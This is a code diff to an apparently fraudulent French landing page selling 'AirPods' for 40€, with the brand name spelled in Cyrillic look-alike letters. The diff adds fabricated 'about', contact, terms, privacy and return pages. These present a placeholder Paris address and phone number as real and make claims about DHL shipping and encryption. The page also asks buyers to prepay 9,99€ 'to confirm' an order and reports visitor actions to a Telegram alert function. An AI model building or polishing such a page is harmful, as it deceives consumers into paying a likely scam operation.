@@ -46,7 +46,9 @@ pintrk('page');
         .details-btn {display:block;width:100%;margin:0 auto 24px auto;}
         .policy-modal {display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:20000;background:rgba(0,0,0,0.40);align-items:center;justify-content:center;}
         .policy-content {background:#fff;border-radius:16px;padding:28px;max-width:500px;width:95%;box-shadow:0 8px 40px rgba(0,0,0,0.13);max-height: 80vh; overflow-y: auto; text-align: left;}
-        .policy-content h2 { text-align: center; }
+        .policy-content h2 { text-align: center; margin-bottom: 1.5rem; font-size: 1.5rem; font-weight: bold;}
+        .policy-content h3 { font-weight: bold; margin-top: 1rem; margin-bottom: 0.5rem; }
+        .policy-content p { margin-bottom: 0.75rem; }
         
         #paymentMethodModal .modal-content {
             max-width: 520px;
@@ -98,6 +100,13 @@ pintrk('page');
         .trustpilot-badge { max-height: 70px; max-width: 250px; width: auto; margin-top: 1rem; margin-bottom: 2rem; }
         .payment-card.border-blue-600 { border-color: #2563eb; }
         .payment-card.shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
+        .footer-links-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 0.5rem 1.5rem;
+            margin-top: 1rem;
+        }
 
     </style>
 </head>
@@ -188,13 +197,17 @@ pintrk('page');
         </section>
 
         <footer class="bg-gray-900 text-gray-300 py-8">
-           <div class="container mx-auto px-4 text-center">
-               <p>&copy; <span id="currentYear">2025</span> Offre Spéciale АігРоdѕ . Tous droits réservés.</p>
-                <div class="mt-4">
-                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="shipping">Politique de livraison</a>
-                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="returns">Politique de retour</a>
+            <div class="container mx-auto px-4 text-center">
+                <p>&copy; <span id="currentYear">2025</span> Offre Spéciale АігРоdѕ . Tous droits réservés.</p>
+                <div class="footer-links-container">
+                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="about">À Propos de Nous</a>
+                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="contact">Contactez-nous</a>
+                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="terms">Conditions Générales</a>
+                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="privacy">Politique de Confidentialité</a>
+                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="shipping">Politique de Livraison</a>
+                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="returns">Politique de Retour</a>
                 </div>
-           </div>
+            </div>
         </footer>
     </main>
 
@@ -222,50 +235,50 @@ pintrk('page');
             <h2 class="text-2xl font-bold mb-5 text-gray-800">Choisissez votre méthode de paiement</h2>
             
              <div id="payment-methods" class="flex flex-col gap-4 mt-4">
-              <!-- Paiement en ligne -->
-              <div class="payment-card transition-all duration-200 border-2 border-gray-200 rounded-2xl bg-white shadow-sm hover:shadow-md cursor-pointer" data-method="online">
-                <div class="flex items-center justify-between p-4">
-                  <!-- Icon on the Left -->
-                  <div class="w-auto h-10 flex items-center justify-center bg-blue-50 rounded-xl p-2">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" class="h-6" alt="Visa" onerror="this.style.display='none'">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" class="h-6 ml-1" alt="Mastercard" onerror="this.style.display='none'">
-                  </div>
-                  <!-- Text on the Right -->
-                  <span class="font-bold text-lg text-gray-800">Paiement en ligne</span>
-                </div>
-                <!-- Details: hidden by default -->
-                <div class="payment-details hidden border-t border-gray-100 px-4 pb-4 pt-3 text-gray-700 text-left">
-                  <div class="flex items-center gap-2 mb-2">
-                    <span class="font-semibold text-blue-700 text-xl">49,99€</span>
-                  </div>
-                  <div>
-                    Payez la totalité : <span class="font-semibold">40€</span> pour le produit + <span class="font-semibold">9,99€</span> de frais de livraison, directement et en toute sécurité en ligne par carte bancaire.
-                  </div>
-                </div>
-              </div>
-              <!-- Paiement à la livraison -->
-              <div class="payment-card transition-all duration-200 border-2 border-gray-200 rounded-2xl bg-white shadow-sm hover:shadow-md cursor-pointer" data-method="cod">
-                <div class="flex items-center justify-between p-4">
-                  <!-- Icon on the Left -->
-                  <div class="w-10 h-10 flex items-center justify-center rounded-xl overflow-hidden">
-                     <img src="https://i.postimg.cc/1tw5r2nf/Screenshot-20250615-204032-Chrome.jpg" class="h-full w-full object-cover" alt="Paiement à la livraison" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/ffffff?text=COD';">
-                  </div>
-                  <!-- Text on the Right -->
-                  <span class="font-bold text-lg text-gray-800">Paiement à la livraison</span>
-                </div>
-                <!-- Details: hidden by default -->
-                <div class="payment-details hidden border-t border-gray-100 px-4 pb-4 pt-3 text-gray-700 text-left">
-                  <div class="flex items-center gap-2 mb-2">
-                    <span class="font-semibold text-blue-700 text-xl">9,99€</span>
-                    <span class="text-sm text-gray-500">(à payer maintenant)</span>
-                  </div>
-                  <div>
-                    Payez uniquement les frais de livraison (<b>9,99€</b>) pour confirmer la commande. <br>
-                    Vous réglerez le reste (<b>40€</b>) en espèces à la réception.
-                  </div>
-                </div>
-              </div>
-            </div>
+               <!-- Paiement en ligne -->
+               <div class="payment-card transition-all duration-200 border-2 border-gray-200 rounded-2xl bg-white shadow-sm hover:shadow-md cursor-pointer" data-method="online">
+                 <div class="flex items-center justify-between p-4">
+                   <!-- Icon on the Left -->
+                   <div class="w-auto h-10 flex items-center justify-center bg-blue-50 rounded-xl p-2">
+                     <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" class="h-6" alt="Visa" onerror="this.style.display='none'">
+                     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" class="h-6 ml-1" alt="Mastercard" onerror="this.style.display='none'">
+                   </div>
+                   <!-- Text on the Right -->
+                   <span class="font-bold text-lg text-gray-800">Paiement en ligne</span>
+                 </div>
+                 <!-- Details: hidden by default -->
+                 <div class="payment-details hidden border-t border-gray-100 px-4 pb-4 pt-3 text-gray-700 text-left">
+                   <div class="flex items-center gap-2 mb-2">
+                     <span class="font-semibold text-blue-700 text-xl">49,99€</span>
+                   </div>
+                   <div>
+                     Payez la totalité : <span class="font-semibold">40€</span> pour le produit + <span class="font-semibold">9,99€</span> de frais de livraison, directement et en toute sécurité en ligne par carte bancaire.
+                   </div>
+                 </div>
+               </div>
+               <!-- Paiement à la livraison -->
+               <div class="payment-card transition-all duration-200 border-2 border-gray-200 rounded-2xl bg-white shadow-sm hover:shadow-md cursor-pointer" data-method="cod">
+                 <div class="flex items-center justify-between p-4">
+                   <!-- Icon on the Left -->
+                   <div class="w-10 h-10 flex items-center justify-center rounded-xl overflow-hidden">
+                      <img src="https://i.postimg.cc/1tw5r2nf/Screenshot-20250615-204032-Chrome.jpg" class="h-full w-full object-cover" alt="Paiement à la livraison" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/ffffff?text=COD';">
+                   </div>
+                   <!-- Text on the Right -->
+                   <span class="font-bold text-lg text-gray-800">Paiement à la livraison</span>
+                 </div>
+                 <!-- Details: hidden by default -->
+                 <div class="payment-details hidden border-t border-gray-100 px-4 pb-4 pt-3 text-gray-700 text-left">
+                   <div class="flex items-center gap-2 mb-2">
+                     <span class="font-semibold text-blue-700 text-xl">9,99€</span>
+                     <span class="text-sm text-gray-500">(à payer maintenant)</span>
+                   </div>
+                   <div>
+                     Payez uniquement les frais de livraison (<b>9,99€</b>) pour confirmer la commande. <br>
+                     Vous réglerez le reste (<b>40€</b>) en espèces à la réception.
+                   </div>
+                 </div>
+               </div>
+             </div>
             <button id="nextToInvoiceBtn" class="w-full bg-gray-400 text-white font-bold py-3 mt-4 rounded-lg transition text-lg" disabled>
               Suivant
             </button>
@@ -573,11 +586,27 @@ pintrk('page');
         const policies = {
             shipping: {
                 title: 'Politique de Livraison',
-                text: `Nous nous efforçons de traiter et d'expédier toutes les commandes dans un délai de 1 à 2 jours ouvrables. La livraison standard prend généralement 5 à 7 jours ouvrables. Vous recevrez un numéro de suivi par e-mail une fois votre commande expédiée. Les frais de livraison sont calculés au moment du paiement.`
+                text: `<h3>Délais de Traitement</h3><p>Nous nous efforçons de traiter et d'expédier toutes les commandes dans un délai de 1 à 2 jours ouvrables après la confirmation du paiement des frais de livraison ou du paiement intégral.</p><h3>Délais de Livraison</h3><p>La livraison standard via notre partenaire DHL prend généralement 5 à 7 jours ouvrables pour arriver à destination. Ces délais sont des estimations et peuvent varier en fonction de votre localisation exacte.</p><h3>Suivi de Commande</h3><p>Une fois votre commande expédiée, vous recevrez un e-mail de confirmation contenant un numéro de suivi. Vous pourrez utiliser ce numéro sur le site de DHL pour suivre l'acheminement de votre colis en temps réel.</p><h3>Frais de Livraison</h3><p>Les frais de livraison sont fixes et s'élèvent à 9,99€ pour toutes les commandes, que vous choisissiez le paiement en ligne ou le paiement à la livraison.</p>`
             },
             returns: {
-                title: 'Politique de Retour',
-                text: `Si vous n'êtes pas entièrement satisfait de votre achat, vous pouvez retourner le produit dans les 30 jours suivant la réception pour un remboursement complet ou un échange. Le produit doit être dans son état d'origine et avec son emballage. Veuillez contacter notre service client pour initier le processus de retour.`
+                title: 'Politique de Retour et Remboursement',
+                text: `<h3>Droit de Rétractation</h3><p>Conformément à la loi, vous disposez d'un délai de 14 jours à compter de la réception de votre produit pour exercer votre droit de rétractation sans avoir à justifier de motifs ni à payer de pénalités. Nous étendons cette période à 30 jours pour votre confort.</p><h3>Conditions de Retour</h3><p>Pour être éligible à un retour, votre article doit être inutilisé et dans le même état où vous l'avez reçu. Il doit également être dans son emballage d'origine complet (boîte, accessoires, manuels, etc.).</p><h3>Processus de Retour</h3><p>Pour initier un retour, veuillez contacter notre service client à contact@offre-speciale-airpods.fr avec votre numéro de commande. Nous vous fournirons les instructions pour retourner le produit. Les frais de retour sont à la charge du client, sauf si le produit est défectueux ou non conforme.</p><h3>Remboursement</h3><p>Une fois votre retour reçu et inspecté, nous vous enverrons un e-mail pour vous informer de l'approbation ou du rejet de votre remboursement. Si approuvé, votre remboursement sera traité et un crédit sera automatiquement appliqué à votre méthode de paiement originale, dans un délai de 5 à 10 jours ouvrables.</p>`
+            },
+            about: {
+                title: 'À Propos de Nous',
+                text: `<p>Bienvenue sur notre boutique ! Nous sommes spécialisés dans la vente de produits électroniques de haute qualité à des prix exceptionnels. Notre mission est de rendre la technologie de pointe accessible à tous grâce à des offres exclusives et des promotions uniques.</p><p>Nous sommes passionnés par l'innovation et nous nous engageons à fournir un service client irréprochable et une expérience d'achat simple et sécurisée.</p><h3>Nous Contacter</h3><p>Pour toute question, n'hésitez pas à nous contacter :</p><p><strong>Adresse :</strong><br>123 Rue de la République<br>75001 Paris, France</p><p><strong>Email :</strong><br>contact@offre-speciale-airpods.fr</p><p><strong>Téléphone :</strong><br>+33 1 23 45 67 89</p>`
+            },
+            terms: {
+                title: 'Conditions Générales de Vente',
+                text: `<h3>Article 1 : Objet</h3><p>Les présentes conditions régissent les ventes par la société (ci-après "le Vendeur") de produits électroniques sur ce site web. Ces conditions s'appliquent à l'exclusion de toutes autres conditions.</p><h3>Article 2 : Prix</h3><p>Les prix de nos produits sont indiqués en euros toutes taxes comprises (TVA et autres taxes applicables au jour de la commande), sauf indication contraire et hors frais de traitement et d'expédition.</p><h3>Article 3 : Commandes</h3><p>Vous pouvez passer commande sur ce site web. Les informations contractuelles sont présentées en langue française et feront l'objet d'une confirmation au plus tard au moment de la validation de votre commande.</p><h3>Article 4 : Paiement</h3><p>Le fait de valider votre commande implique pour vous l'obligation de payer le prix indiqué. Le règlement de vos achats s'effectue par carte bancaire grâce au système sécurisé ou par paiement des frais de livraison suivi d'un paiement en espèces à la livraison.</p><h3>Article 5 : Responsabilité</h3><p>Les produits proposés sont conformes à la législation française en vigueur. La responsabilité du Vendeur ne saurait être engagée en cas de non-respect de la législation du pays où le produit est livré.</p><h3>Article 6 : Droit Applicable</h3><p>La langue du présent contrat est la langue française. Toutes les clauses figurant dans les présentes conditions générales de vente, ainsi que toutes les opérations d'achat et de vente qui y sont visées, seront soumises au droit français.</p>`
+            },
+            privacy: {
+                title: 'Politique de Confidentialité',
+                text: `<h3>Collecte de l'Information</h3><p>Nous recueillons des informations lorsque vous passez une commande. Les informations recueillies incluent votre nom, votre adresse e-mail, votre numéro de téléphone et votre adresse de livraison. En outre, nous recevons et enregistrons automatiquement des informations à partir de votre ordinateur et navigateur, y compris votre adresse IP.</p><h3>Utilisation des Informations</h3><p>Toutes les informations que nous recueillons auprès de vous peuvent être utilisées pour : traiter vos commandes, personnaliser votre expérience, améliorer notre site web, et améliorer le service client.</p><h3>Confidentialité du Commerce en Ligne</h3><p>Nous sommes les seuls propriétaires des informations recueillies sur ce site. Vos informations personnelles ne seront pas vendues, échangées, transférées, ou données à une autre société sans votre consentement, en dehors de ce qui est nécessaire pour répondre à une demande et/ou une transaction, comme par exemple pour expédier une commande.</p><h3>Sécurité des Transactions</h3><p>Nous mettons en œuvre une variété de mesures de sécurité pour préserver la sécurité de vos informations personnelles. Nous utilisons un cryptage à la pointe de la technologie pour protéger les informations sensibles transmises en ligne.</p><h3>Consentement</h3><p>En utilisant notre site, vous consentez à notre politique de confidentialité.</p>`
+            },
+            contact: {
+                title: 'Contactez-nous',
+                text: `<p>Nous sommes là pour vous aider ! Si vous avez des questions sur notre offre, votre commande, ou si vous avez besoin d'assistance, n'hésitez pas à nous contacter via les moyens ci-dessous.</p><h3>Nos Coordonnées</h3><p><strong>Adresse :</strong><br>123 Rue de la République<br>75001 Paris, France</p><p><strong>Email :</strong><br>contact@offre-speciale-airpods.fr</p><p><strong>Téléphone :</strong><br>+33 1 23 45 67 89</p><p>Notre équipe du service client s'efforce de répondre à toutes les demandes dans un délai de 24 heures ouvrables.</p>`
             }
         };
 
@@ -586,8 +615,8 @@ pintrk('page');
                 e.preventDefault();
                 const policyKey = e.target.getAttribute('data-policy');
                 if (policies[policyKey] && policyModal && policyTitle && policyText) {
-                    policyTitle.innerText = policies[policyKey].title;
-                    policyText.innerText = policies[policyKey].text;
+                    policyTitle.innerHTML = policies[policyKey].title;
+                    policyText.innerHTML = policies[policyKey].text;
                     policyModal.style.display = 'flex';
                     sendTelegramAlert('Consultation de politique', { type: policyKey });
                 }
@@ -601,4 +630,3 @@ pintrk('page');
 
 </body>
 </html>
-
